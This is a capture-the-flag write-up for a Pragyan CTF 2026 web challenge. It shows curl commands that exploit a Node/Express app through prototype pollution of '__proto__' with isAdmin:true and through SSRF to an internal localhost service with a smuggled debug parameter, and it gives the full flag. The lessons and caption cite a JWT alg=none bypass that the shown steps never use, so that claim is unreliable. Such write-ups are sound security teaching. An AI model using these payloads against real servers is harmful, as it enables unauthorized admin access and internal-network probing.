# Server OC

**CTF/platform:** Pragyan CTF 2026

**Category:** Web

**Difficulty:** Hard

**Description:** Overclocking increases FPS, but for a SysAd, does it increase...Requests Per Second? (flag in two parts)

**Remote:** `https://server-oc.ctf.prgy.in/`

**Flag:** `p_ctf{L!qU1d_H3L1um_$h0ulD_N0T_T0uch_$3rv3rs}`

## Description

> Overclocking increases FPS, but for a SysAd, does it increase...Requests Per Second?
> Note: the flag is in two parts.

## Analysis

Node.js/Express application that simulates server overclocking. Discovered endpoints:

| Endpoint             | Method | Description                              |
|----------------------|--------|------------------------------------------|
| `/`                  | GET    | HTML frontend                            |
| `/script.js`         | GET    | Client JavaScript                        |
| `/robots.txt`        | GET    | Hardware info (i9-9900K)                 |
| `/api/overclock`     | POST   | Set CPU multiplier                       |
| `/api/reset`         | POST   | Reset multiplier to 30x                  |
| `/api/benchmark/url` | GET    | Get URL for internal benchmark           |
| `/benchmark`         | GET    | SSRF — fetches provided URL              |
| `/leConfig`          | POST   | Generates JWT with `/logs` endpoint      |
| `/logs`              | POST   | Reads system "logs" (requires permissions)|

### Key frontend code (`script.js`)

```javascript
async function handleResponse(response) {
    const result = await response.json();
    display.innerText = result.displayValue || "30x";
    if (result.showBe) btnBe.style.display = "block";
    if (result.fetchConfig) await fetch('/leConfig', { method: 'POST' }); // ← Part 2?
}

btnBe.addEventListener('click', async () => {
    const urlResponse = await fetch("/api/benchmark/url");
    const urlData = await urlResponse.json();
    await fetch(urlData.url);  // SSRF to localhost:3001
});
```

### Decoded JWT

```json
{
  "endpoint": "/logs",
  "examplePayload": { "Path": "C:\\Windows\\Log\\systemRestore" },
  "iat": 1770395222
}
```

## Vulnerability — Part 1

- **Type**: Prototype Pollution + privileged access
- **Root cause**: The `/api/overclock` endpoint does recursive merge of JSON body without sanitizing `__proto__`
- **Impact**: Pollute `Object.prototype` with `isAdmin: true` to access `/logs`

## Exploitation — Part 1

### Strategy

1. Pollute prototype with `isAdmin: true` via `/api/overclock`
2. Get JWT from `/leConfig`
3. Call `/logs` with the example path from the JWT

### Exploit

```bash
# 1. Visit the page to get session cookie
curl -s https://server-oc.ctf.prgy.in/ -c /tmp/oc_cookies.txt > /dev/null

# 2. Prototype pollution: inject isAdmin=true
curl -s -X POST https://server-oc.ctf.prgy.in/api/overclock \
  -H "Content-Type: application/json" \
  -d '{"multiplier":50,"__proto__":{"isAdmin":true}}' \
  -b /tmp/oc_cookies.txt -c /tmp/oc_cookies.txt

# 3. Get JWT
curl -s -X POST https://server-oc.ctf.prgy.in/leConfig \
  -b /tmp/oc_cookies.txt -c /tmp/oc_cookies.txt

# 4. Read flag Part 1
curl -s -X POST https://server-oc.ctf.prgy.in/logs \
  -H "Content-Type: application/json" \
  -d '{"Path":"C:\\Windows\\Log\\systemRestore"}' \
  -b /tmp/oc_cookies.txt

# Response: {"message":"p_ctf{L!qU1d_H3L1um_"}
```

## Part 2 — SSRF via /benchmark with debug=true

### Discovered

- Multiplier **76** with `isAdmin: true` activates `showBe: true` (benchmark button)
- The benchmark does SSRF to `http://localhost:3001/benchmark?internal=flag`
- Normal response: `"It should be hiding here somewhere..."`
- When adding `debug=true` as parameter, the internal service reveals Part 2

### Exploit Part 2

```bash
# SSRF with parameter pollution: debug=true
curl -s "https://server-oc.ctf.prgy.in/benchmark?url=http://localhost:3001/benchmark?internal=flag%26debug=true" \
  -b /tmp/oc_cookies.txt
# Response: $h0ulD_N0T_T0uch_$3rv3rs}
```

## Flag (complete)

```
p_ctf{L!qU1d_H3L1um_$h0ulD_N0T_T0uch_$3rv3rs}
```

Translation: "Liquid Helium should not touch servers" — reference to extreme cooling for overclocking.

## Lessons Learned

- Prototype pollution in Express: always test `__proto__` in JSON bodies
- In Node.js, pollution is GLOBAL: affects all server users
- SSRF endpoints are key: always try changing host, port, protocol and path
- Parameter pollution (`debug=true`) can reveal hidden information in internal services
- JWT alg=none bypass still works in homemade implementations

---

## PoC

### Exploit Execution

<img src="serveroc.png" alt="Exploit execution" width="800">

*Screenshot showing successful execution of the exploit combining JWT alg=none bypass, prototype pollution and SSRF to obtain the flag.*
